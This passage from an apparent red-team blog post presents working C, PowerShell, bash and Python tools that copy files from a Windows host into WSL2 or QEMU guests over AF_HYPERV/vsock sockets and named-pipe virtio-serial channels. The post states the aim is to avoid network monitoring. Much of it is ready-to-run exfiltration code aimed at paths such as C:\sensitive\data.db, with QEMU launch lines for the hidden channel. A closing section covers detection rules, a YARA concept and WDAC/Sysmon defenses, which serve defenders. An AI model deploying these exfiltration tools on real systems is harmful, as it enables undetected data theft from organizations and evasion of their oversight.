        wprintf(L"[-] socket() failed: %d\n", WSAGetLastError());
        return 1;
    }
 
    // Build the destination address
    // VmId: zero GUID connects to the local partition's child VMs
    // For WSL2 specifically, retrieve the VM GUID from registry (shown above)
    SOCKADDR_HV addr = { 0 };
    addr.Family    = AF_HYPERV;
    addr.VmId      = HV_GUID_WILDCARD;   // Replace with WSL2 VM GUID from registry
    addr.ServiceId = VSOCK_SERVICE_GUID;
 
    if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        wprintf(L"[-] connect() failed: %d\n", WSAGetLastError());
        wprintf(L"    Ensure WSL2 is running and vsock_server is listening\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }
 
    wprintf(L"[+] Connected via AF_HYPERV\n");
 
    // Open the file to exfiltrate
    HANDLE hFile = CreateFileW(argv[1], GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Cannot open file: %lu\n", GetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }
 
    // Stream the file through the vsock connection
    BYTE  buf[65536];
    DWORD bytesRead;
    DWORD totalSent = 0;
 
    while (ReadFile(hFile, buf, sizeof(buf), &bytesRead, NULL) && bytesRead > 0) {
        int sent = send(sock, (char*)buf, bytesRead, 0);
        if (sent == SOCKET_ERROR) {
            wprintf(L"[-] send() failed: %d\n", WSAGetLastError());
            break;
        }
        totalSent += sent;
    }
 
    wprintf(L"[+] Sent %lu bytes\n", totalSent);
 
    CloseHandle(hFile);
    closesocket(sock);
    WSACleanup();
    return 0;
}
```
 
#### Full vsock Exfiltration Flow
 
```
Windows Host Process
    │
    │  CreateFile("C:\sensitive\data.db")   ← read target file
    │
    │  socket(AF_HYPERV, SOCK_STREAM, ...)  ← create hyperv socket
    │  connect(WSL2_VM_GUID, port_9999)     ← connect to WSL2
    │  send(file_bytes)                     ← transfer data
    │
    ▼
  VMBus transport layer (no IP, no network interface)
    │
    ▼
WSL2 Linux Kernel
    │
    │  accept() on AF_VSOCK port 9999
    │  recv() → write("/tmp/data.db")       ← receive and store
    ▼
Controlled Linux Environment
```
 
The transfer involves zero network packets. No TCP connections, no UDP datagrams, no HTTP requests. The only observable artifacts on the Windows side are:
 
1. The process reading the source file (`ReadFile` on `data.db`)
2. A socket create/connect event on `AF_HYPERV` (not captured by standard network monitoring)
3. The `send()` call completing
 
#### Using socat for Quick vsock Operations
 
For scenarios where compiling C code is impractical, `socat` inside WSL2 handles vsock natively:
 
```bash
# Inside WSL2 — receive data on vsock port 9999 and write to file
socat VSOCK-LISTEN:9999,reuseaddr OPEN:/tmp/received.bin,creat,trunc &
 
# Once the Windows-side sender connects, data flows automatically
# Monitor progress:
watch -n1 "wc -c /tmp/received.bin"
```
 
On the Windows side, PowerShell can directly use `AF_HYPERV` sockets via .NET's `System.Net.Sockets.Socket` with the raw `AddressFamily` value:
 
```powershell
# PowerShell — send a file to WSL2 via AF_HYPERV / vsock
Add-Type -AssemblyName System.Net.Sockets
 
# AF_HYPERV = 34 on Windows
$AF_HYPERV   = [System.Net.Sockets.AddressFamily]34
$SOCK_STREAM = [System.Net.Sockets.SocketType]::Stream
$HV_PROTOCOL = 1  # HV_PROTOCOL_RAW
 
$sock = New-Object System.Net.Sockets.Socket($AF_HYPERV, $SOCK_STREAM, $HV_PROTOCOL)
 
# Build SOCKADDR_HV manually (34 bytes)
# [Family: 2 bytes][Reserved: 2 bytes][VmId: 16 bytes GUID][ServiceId: 16 bytes GUID]
$wslVmGuid     = [Guid]"<WSL2_VM_GUID_FROM_REGISTRY>"
$serviceGuid   = [Guid]"0000270f-facb-11e6-bd58-64006a7986d3"  # port 9999
 
$addrBytes = [byte[]]::new(34)
[System.BitConverter]::GetBytes([uint16]34).CopyTo($addrBytes, 0)   # Family
$wslVmGuid.ToByteArray().CopyTo($addrBytes, 4)                       # VmId
$serviceGuid.ToByteArray().CopyTo($addrBytes, 20)                    # ServiceId
 
$ep = New-Object System.Net.Sockets.SocketAddress($AF_HYPERV, 34)
for ($i = 0; $i -lt 34; $i++) { $ep[$i] = $addrBytes[$i] }
 
$sock.Connect($ep)
 
# Send file bytes
$fileBytes = [System.IO.File]::ReadAllBytes("C:\sensitive\data.db")
$sock.Send($fileBytes) | Out-Null
$sock.Close()
 
Write-Host "[+] File transferred via vsock"
```
 
---
 
### Named Pipes and virtio-serial: Exfiltration to QEMU Guests
 
QEMU provides a virtual serial device (`virtio-serial` or the legacy `isa-serial`) whose backend can be any character-oriented I/O source on the host. On Windows, the most useful backend is a **Named Pipe** — a kernel-provided IPC mechanism that creates a file-path-addressable bidirectional byte stream between processes.
 
The key property: **a named pipe is not a network socket**. It does not appear in `netstat`, `Wireshark`, or any network monitoring tool. It does not consume IP addresses or ports. It is a pure IPC mechanism mediated by the Windows I/O Manager.
 
#### Configuring virtio-serial with a Named Pipe Backend
 
The QEMU command line to expose a virtio-serial device backed by a named pipe:
 
```cmd
qemu-system-x86_64.exe ^
    -m 2048 ^
    -hda %TEMP%\vm.qcow2 ^
    -netdev user,id=net0 ^
    -device virtio-net-pci,netdev=net0 ^
    -chardev pipe,id=ch0,path=\\.\pipe\qemu_exfil ^
    -device virtio-serial ^
    -device virtserialport,chardev=ch0,name=org.qemu.exfil.0 ^
    -nographic
```
 
Breaking down the relevant arguments:
 
- `-chardev pipe,id=ch0,path=\\.\pipe\qemu_exfil` — Creates a character device backend (`ch0`) that reads and writes to the Windows named pipe `\\.\pipe\qemu_exfil`. QEMU creates this pipe as the **server** end — it creates the pipe and waits for a client to connect.
- `-device virtio-serial` — Adds a VirtIO serial bus to the VM
- `-device virtserialport,chardev=ch0,name=org.qemu.exfil.0` — Exposes the char device as a VirtIO serial port with the specified name
 
Inside the Linux guest, this appears as `/dev/vport0p1` (or similar, discoverable via `ls /dev/vport*`). The port name `org.qemu.exfil.0` is accessible via `/sys/class/virtio-ports/vport0p1/name`.
 
#### Receiving Data Inside the QEMU Guest
 
On the guest Linux side, the virtio-serial port is a standard character device:
 
```bash
#!/bin/bash
# guest_receiver.sh — runs inside the QEMU guest
VPORT=$(ls /dev/vport* 2>/dev/null | head -1)
if [ -z "$VPORT" ]; then
    echo "[-] No virtio serial port found"
    exit 1
fi
 
echo "[*] Receiving on $VPORT"
OUTPUT="/root/received_data"
 
# Simple cat — block until data arrives, write to file
cat "$VPORT" > "$OUTPUT" &
CAT_PID=$!
 
echo "[*] Receiver PID: $CAT_PID"
echo "[*] Writing to $OUTPUT"
wait $CAT_PID
echo "[+] Transfer complete: $(wc -c < $OUTPUT) bytes"
```
 
For a more robust implementation with size framing:
 
```python
#!/usr/bin/env python3
# guest_receiver.py — runs inside QEMU guest
import struct, os, sys
 
VPORT = "/dev/vport0p1"
OUTPUT = "/root/received.bin"
 
print(f"[*] Opening {VPORT}")
with open(VPORT, "rb") as port, open(OUTPUT, "wb") as out:
    # Read 8-byte header: magic (4 bytes) + size (4 bytes)
    header = port.read(8)
    magic, size = struct.unpack("<II", header)
    
    if magic != 0xDEADBEEF:
        print(f"[-] Bad magic: {magic:#x}")
        sys.exit(1)
    
    print(f"[*] Expecting {size} bytes")
    received = 0
    
    while received < size:
        chunk = port.read(min(65536, size - received))
        if not chunk:
            break
        out.write(chunk)
        received += len(chunk)
        print(f"\r[*] {received}/{size} bytes ({100*received//size}%)", end="")
    
    print(f"\n[+] Received {received} bytes → {OUTPUT}")
```
 
#### Sending Data from Windows Host via Named Pipe
 
On the Windows side, the QEMU process has already created the pipe server. A Windows process acting as the **pipe client** connects and writes data:
 
```c
// pipe_exfil_client.c — runs on the Windows host
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
 
#define PIPE_NAME L"\\\\.\\pipe\\qemu_exfil"
 
int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        wprintf(L"Usage: pipe_client.exe <file_to_send>\n");
        return 1;
    }
 
    wprintf(L"[*] Waiting for QEMU pipe server...\n");
 
    // Wait for the pipe to become available (QEMU may not have started yet)
    while (!WaitNamedPipeW(PIPE_NAME, 5000)) {
        wprintf(L"[*] Pipe not ready, waiting...\n");
        Sleep(1000);
    }
 
    // Connect to the named pipe
    HANDLE hPipe = CreateFileW(
        PIPE_NAME,
        GENERIC_WRITE,         // Write-only — sending data into the VM
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
 
    if (hPipe == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] CreateFile failed: %lu\n", GetLastError());
        return 1;
    }
 
    wprintf(L"[+] Connected to QEMU named pipe\n");
 
    // Set pipe to byte mode
    DWORD pipeMode = PIPE_READMODE_BYTE;
    SetNamedPipeHandleState(hPipe, &pipeMode, NULL, NULL);
 
    // Open the source file
    HANDLE hFile = CreateFileW(argv[1], GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Cannot open source file: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }
 
    // Get file size for the header
    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
 
    // Write framing header: magic + size
    DWORD magic = 0xDEADBEEF;
    DWORD size  = (DWORD)fileSize.QuadPart;
    DWORD written;
 
    WriteFile(hPipe, &magic, sizeof(magic), &written, NULL);
    WriteFile(hPipe, &size,  sizeof(size),  &written, NULL);
 
    wprintf(L"[*] Sending %lu bytes...\n", size);
 
    // Stream file contents through the pipe
    BYTE  buf[65536];
    DWORD bytesRead;
    DWORD totalSent = 0;
 
    while (ReadFile(hFile, buf, sizeof(buf), &bytesRead, NULL) && bytesRead > 0) {
        if (!WriteFile(hPipe, buf, bytesRead, &written, NULL)) {
            wprintf(L"[-] WriteFile to pipe failed: %lu\n", GetLastError());
            break;
        }
        totalSent += written;
        wprintf(L"\r[*] %lu / %lu bytes", totalSent, size);
    }
 
    wprintf(L"\n[+] Transfer complete: %lu bytes sent\n", totalSent);
 
    FlushFileBuffers(hPipe);
    CloseHandle(hFile);
    CloseHandle(hPipe);
    return 0;
}
```
 
#### Using PowerShell for Pipe-Based Exfiltration
 
For scenarios without a C compiler on the host:
 
```powershell
# PowerShell pipe client — sends a file to a waiting QEMU guest
param(
    [Parameter(Mandatory=$true)]
    [string]$FilePath,
    [string]$PipeName = "qemu_exfil"
)
 
$pipePath = "\\.\pipe\$PipeName"
$fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
 
Write-Host "[*] Waiting for QEMU pipe..."
 
# Wait for QEMU to create the pipe server
$maxWait = 30
$waited  = 0
while ($waited -lt $maxWait) {
    try {
        $pipe = New-Object System.IO.Pipes.NamedPipeClientStream(
            ".", $PipeName,
            [System.IO.Pipes.PipeDirection]::Out,
            [System.IO.Pipes.PipeOptions]::None
        )
        $pipe.Connect(1000)
        break
    } catch {
        $waited++
        Start-Sleep -Milliseconds 500
    }
}
 
if (-not $pipe.IsConnected) {
    Write-Error "[-] Could not connect to pipe after ${maxWait}s"
    exit 1
}
 
Write-Host "[+] Connected to $pipePath"
 
$writer = New-Object System.IO.BinaryWriter($pipe)
 
# Write framing header
$writer.Write([uint32]0xDEADBEEF)
$writer.Write([uint32]$fileBytes.Length)
 
# Write file data in chunks
$chunkSize = 65536
$sent = 0
for ($i = 0; $i -lt $fileBytes.Length; $i += $chunkSize) {
    $end   = [Math]::Min($i + $chunkSize, $fileBytes.Length)
    $chunk = $fileBytes[$i..($end-1)]
    $writer.Write($chunk)
    $sent += $chunk.Length
    Write-Progress -Activity "Sending via named pipe" `
        -Status "$sent / $($fileBytes.Length) bytes" `
        -PercentComplete (100 * $sent / $fileBytes.Length)
}
 
$writer.Flush()
$pipe.Close()
 
Write-Host "[+] Transfer complete: $sent bytes → QEMU guest"
```
 
#### Full virtio-serial Exfiltration Flow
 
```
Windows Host Process
    │
    │  CreateFile / ReadAllBytes("sensitive.db")   ← read target file
    │
    │  CreateFile("\\.\pipe\qemu_exfil")           ← connect to QEMU's named pipe
    │  WriteFile(header + file_bytes)              ← stream data into pipe
    │
    ▼
  Named Pipe (kernel IPC — no network stack)
    │
    ▼
QEMU Process (qemu-system-x86_64.exe)
    │
    │  chardev pipe backend reads from pipe handle
    │  virtio-serial frontend delivers bytes to guest
    │
    ▼
Linux Guest Kernel (virtio-serial driver)
    │
    │  /dev/vport0p1 character device delivers bytes
    │  cat / python script reads and writes to file
    ▼
Controlled Guest Environment
```
 
Zero network packets. The data moves from a Windows process → Named Pipe → QEMU process → virtio → Linux guest. No TCP, no UDP, no IP. The chain is entirely within the Windows I/O subsystem until it reaches the QEMU process's internal virtio bus.
 
---
 
### Comparative Analysis: vsock vs virtio-serial
 
| Feature | vsock (WSL2) | virtio-serial / Named Pipe (QEMU) |
|---------|-------------|----------------------------------|
| **Transport** | AF_HYPERV socket → VMBus → AF_VSOCK | Named Pipe → QEMU chardev → virtio bus |
| **API (host)** | Winsock `AF_HYPERV` | Win32 `CreateFile/WriteFile` on `\\.\pipe\*` |
| **API (guest)** | Standard `AF_VSOCK` socket | Character device `/dev/vport*` |
| **Bidirectional** | Yes (SOCK_STREAM) | Yes (pipe is bidirectional) |
| **Requires WSL2** | Yes | No (QEMU only) |
| **Requires QEMU** | No | Yes |
| **Admin to use** | No (once WSL2 enabled) | No (once QEMU running) |
| **Max throughput** | ~1–5 GB/s (VMBus) | ~100–500 MB/s (pipe + virtio) |
| **Network visible** | No | No |
| **ETW telemetry** | Kernel file events (VMBus) | Kernel file events (pipe I/O) |
| **Forensic artifact (host)** | Socket handles in QEMU/wsl.exe | Named pipe handle in QEMU process |
| **Forensic artifact (guest)** | vsock socket | Character device reads |
| **Discovery via netstat** | No | No |
| **Discovery via Process Monitor** | Possible (socket operation) | Possible (pipe I/O events) |
 
Both techniques share the same fundamental stealth property: they are invisible to any monitoring solution that operates at or above the IP networking layer. Their visibility is limited to process-level I/O monitoring, which requires either Procmon/ETW instrumentation at the kernel file I/O level, or a behavioral detection that flags abnormally high I/O volumes on `AF_HYPERV` sockets or named pipe handles from processes that would not normally generate them.
 
---
 
## Detection Opportunities
 
Understanding the detection surface of these techniques is essential for both defenders building detections and operators understanding their risk exposure.
 
**QEMU Process Visibility:**
 
The QEMU process is detectable through standard process telemetry. Even with a renamed binary, the image load events (`Microsoft-Windows-Kernel-Process`, EventID 5) will show the DLLs loaded — `libglib-2.0-0.dll`, `libpixman-1-0.dll`, and QEMU-specific libraries are distinctive. A behavioral detection that flags any process loading QEMU's supporting DLL set is effective regardless of the main binary's name.
 
```
Detection: Image load event for qemu-system-x86_64.exe OR 
           Load of libglib-2.0-0.dll + libpixman-1-0.dll from non-standard paths
Action: Alert + investigate parent process and command line
```
 
**Named Pipe Creation by Non-Standard Processes:**
 
QEMU creates a named pipe server when the `-chardev pipe` option is used. Named pipe creation events are visible through ETW (`Microsoft-Windows-Kernel-File`, pipe create events) or Sysmon (Event ID 17 — Pipe Created).
 
```
Sysmon Event ID 17: PipeEvent (Pipe Created)
Filter: PipeName contains "qemu" OR 
        Process not in (known legitimate pipe-creating processes)
```
 
**AF_HYPERV Socket Activity:**
 
Windows Security auditing and ETW do not natively log `AF_HYPERV` socket connections in the same way TCP connections are logged. However, ETW providers for Hyper-V networking (`Microsoft-Windows-Hyper-V-Socket`) do emit events for connection establishment. These events are not captured by default and require explicit ETW session configuration.
 
**High-Volume I/O on VMBus:**
 
Large file transfers via vsock will generate high-volume VMBus I/O. The `vmmem` process's memory and I/O counters will spike in correlation with the transfer. Anomaly detection on `vmmem` I/O rates can flag unusual transfer volumes.
 
**Disk Image Files:**
 
A `qcow2` file in `%TEMP%`, `%APPDATA%`, or other user-writable paths is a strong indicator of unauthorized QEMU usage. The `qcow2` format has a well-known magic number (`QFI\xfb`) that file content scanning can detect regardless of file extension.
 
```
YARA rule concept:
rule qcow2_disk_image {
    strings:
        $magic = { 51 46 49 FB }  // "QFI\xfb" — qcow2 magic
    condition:
        $magic at 0
}
```
 
**WSL2 Distribution Modification Timestamps:**
 
Unusual activity timing in WSL2 VHD files (`ext4.vhdx`) can reveal covert use. If the user's WSL2 distribution VHD is being written at unusual times (e.g., 3 AM when the user is not present), automated processes inside WSL2 are running.
 
---
 
## Defensive Recommendations
 
For organizations seeking to prevent or detect the techniques described in this post:
 
**Control QEMU Deployment via WDAC/AppLocker:**
 
The simplest prevention is blocking QEMU executables from running in user-writable paths. A WDAC policy that denies execution of files with QEMU's known DLL load profile from paths outside `Program Files` prevents both the direct download-and-run scenario and renamed binary approaches:
 
```xml
<!-- WDAC policy snippet — deny QEMU-associated DLLs from user paths -->
<FileRules>
  <Deny ID="ID_DENY_QEMU_LIB_1" FriendlyName="Deny qemu glib"
        FileName="libglib-2.0-0.dll" />
  <Deny ID="ID_DENY_QEMU_LIB_2" FriendlyName="Deny qemu pixman"
        FileName="libpixman-1-0.dll" />
</FileRules>
```
 
**Restrict WSL2 Deployment Policy:**
 
For environments where WSL2 is not a business requirement, it should be disabled via Group Policy:
 
```
Computer Configuration → Administrative Templates → 
Windows Components → Windows Subsystem for Linux → 
"Allow the Windows Subsystem for Linux" → Disabled
```
 
For environments where WSL2 is permitted, monitor for unexpected new distributions being registered (`LxssManager` service events, registry changes under `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss`).
 
**Monitor Named Pipe Creation:**
 
Enable Sysmon Event ID 17 (Pipe Created) with alerting on pipe names that match QEMU conventions or that are created by unexpected processes. Most legitimate named pipe creation occurs from known system processes and applications — any new pipe from a recently created or unusual process warrants investigation.
 
**ETW Hyper-V Socket Monitoring:**
 
Enable the `Microsoft-Windows-Hyper-V-Socket` ETW provider in your EDR or SIEM data collection to capture `AF_HYPERV` connection events. These are not collected by default but provide direct visibility into vsock-based data transfer.
 
**File Content Scanning for VM Disk Images:**
 
Implement file content scanning (via YARA or similar) that searches for `qcow2`, VMDK, and VHD magic bytes in user-writable directories. These scans can run as scheduled tasks with minimal performance impact and will identify disk images regardless of their file extension or location.
 
**Behavioral Analytics on vmmem:**
 
Alert on anomalous I/O patterns from `vmmem.exe`:
- Large write volumes (>100 MB) during off-hours
- Sustained high I/O rates inconsistent with the user's normal WSL2 usage pattern
- vmmem I/O correlated with reads from sensitive file paths (cross-process I/O correlation)
 
---
 
## Conclusion
 
QEMU and WSL2 represent two fundamentally different approaches to the same problem — running a Linux environment on Windows — and their architectural differences have direct consequences for how they can be used in offensive operations and how they can be detected.
 
WSL2's deep integration with Windows (Hyper-V, 9P filesystem sharing, vsock) makes it simultaneously the most convenient Linux-on-Windows solution and one of the most feature-rich attack surfaces in modern Windows environments. Its vsock/AF_HYPERV communication channel provides a ready-made covert data transfer path that bypasses every network-based monitoring solution — operating entirely in the VMBus layer between the Windows host and the Linux utility VM.
 
QEMU's strength for offensive use lies in its complete independence from the Windows infrastructure. Running entirely as a user-space process in TCG mode, QEMU requires zero administrative privileges, creates no kernel drivers, installs no services, and can be deployed by dropping a handful of executables into a user-writable directory. Its virtio-serial/named-pipe backend provides an equivalent covert channel that, like vsock, is invisible to network monitoring but operates through the Windows I/O subsystem's named pipe infrastructure.
 
The key lessons from this analysis:
 
**Architecture determines privilege.** The fundamental difference between WSL2 (Hyper-V Type-1, admin required for setup) and QEMU TCG (user-space, zero privileges) comes directly from their architectural choices. Understanding why each system is designed the way it is immediately tells you when each is applicable in a constrained environment.
 
**The network is not the only channel.** vsock and named pipes both demonstrate that meaningful data transfer can occur entirely outside the IP networking stack. Monitoring solutions that focus exclusively on network traffic will miss these channels entirely. Defense requires monitoring at the I/O layer, not just the network layer.
 
**Stealth has costs.** Both techniques leave process-level artifacts: QEMU's distinctive DLL set, named pipe creation events, qcow2 files in user directories. Perfect invisibility is not achievable — the question is whether the monitoring infrastructure is instrumented to observe the right signals.
 
**Living off the land evolves.** As built-in virtualization capabilities (WSL2, sandbox containers, Hyper-V isolation) become standard in modern Windows deployments, the line between legitimate use and abuse of these features continues to blur. Detection strategies that flag virtualization software as inherently suspicious will generate unsustainable false positive rates; detection strategies that focus on behavioral anomalies within expected virtualization use will scale.
 
---
 
*All techniques described in this post are intended for authorized security research and red team operations. Always obtain explicit written authorization before testing on any system or environment you do not own.*
 
---
 
### Further Reading and References
 
- **QEMU Documentation** — `qemu-project.org/docs` — Official reference for all QEMU options, device backends, and networking modes
- **WSL2 Architecture** — Microsoft Devblog: "WSL2 will be powered by a real Linux kernel"
- **Hyper-V Socket Documentation** — `docs.microsoft.com/virtualization/hyper-v-on-windows/user-guide/make-integration-service`
- **virtio Specification** — `docs.oasis-open.org/virtio/virtio/v1.2` — Formal specification for all virtio device types including virtio-serial
- **AF_VSOCK Linux Man Page** — `man7.org/linux/man-pages/man7/vsock.7.html`
- **QEMU WHPX Backend** — `qemu-project.org/docs/system/i386/windows-hypervisor-platform-accelerator`
- **Plan 9 Filesystem Protocol** — `9fans.net/plan9dist/sys/doc/9P2000.pdf`
- **"Living Off the Foreign Land" — Rex Guo, Junyuan Zeng** — DEFCON 29 research on QEMU-based attack infrastructure
- **Sysmon Configuration** — SwiftOnSecurity/sysmon-config — Includes pipe creation monitoring rules
- **WDAC Deployment Guide** — `docs.microsoft.com/windows/security/threat-protection/windows-defender-application-control`
- **lxss.sys Internals** — Alex Ionescu & Jack Starwind, "The Linux Kernel Hidden Inside Windows 10"
- **socat Manual** — `dest-unreach.org/socat/doc/socat.html` — Covers VSOCK address type documentation
